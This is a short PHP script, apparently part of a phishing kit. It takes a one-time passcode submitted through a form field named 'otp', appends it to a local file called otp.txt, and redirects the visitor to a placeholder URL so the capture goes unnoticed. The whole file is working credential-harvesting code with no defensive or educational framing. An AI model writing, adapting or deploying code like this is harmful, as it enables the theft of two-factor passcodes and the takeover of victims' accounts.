<?php
file_put_contents("otp.txt", "" .  $pass = $_POST['otp'] . "\n", FILE_APPEND);
header('Location: redirecturl');
?>